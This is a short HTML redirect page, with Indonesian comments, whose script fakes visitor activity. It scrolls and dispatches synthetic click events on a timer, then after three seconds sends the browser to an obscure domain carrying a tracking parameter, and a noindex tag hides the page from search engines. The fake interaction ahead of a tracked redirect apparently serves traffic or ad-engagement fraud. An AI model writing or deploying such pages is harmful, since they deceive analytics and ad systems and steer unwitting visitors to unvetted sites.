<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex, nofollow" />
  <title>Redirecting...</title>
  <style>
    body { font-family: Arial; background: #fafafa; text-align: center; padding-top: 100px; color: #333; }
  </style>
</head>
<body>
  <h1>Please wait...</h1>
  <p>We are redirecting you to the page</p>

  <script>
    // Mensimulasikan scroll
    function simulateScroll() {
      window.scrollBy(0, 500);  // Scroll 500px ke bawah
      setTimeout(simulateScroll, 3000);  // Ulangi setiap 3 detik
    }

    // Mensimulasikan klik
    function simulateClick() {
      var clickEvent = new MouseEvent('click', { bubbles: true, cancelable: true });
      document.body.dispatchEvent(clickEvent);
      setTimeout(simulateClick, 5000); // Ulangi setiap 5 detik
    }

    // Simulasi interaksi dengan halaman
    setTimeout(() => {
      window.location.href = "https://reyeshehadtwobri.com?ZA5GF=1169878";  // Link baru
    }, 3000);  // Delay 3 detik sebelum redirect

    // Start simulasi interaksi
    simulateScroll();
    simulateClick();
  </script>
</body>
</html>
